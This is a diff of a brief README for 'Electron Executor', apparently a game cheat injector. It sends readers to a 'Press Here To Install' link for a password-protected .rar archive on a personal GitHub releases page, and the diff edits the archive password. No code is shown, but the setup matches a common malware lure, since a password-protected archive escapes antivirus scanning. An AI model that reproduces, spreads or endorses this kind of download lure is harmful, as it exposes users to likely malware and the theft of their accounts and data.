@@ -1,7 +1,7 @@
 # Electron Executor 🌟
   Status: Work ✅
 
-pass🔑 - Electron
+pass🔑 - (Electron)
 
  👉 [Press Here To Install](https://github.com/ivonsilva1/Electron-Executor/releases/download/Electron/Electron.rar) 👈 
 
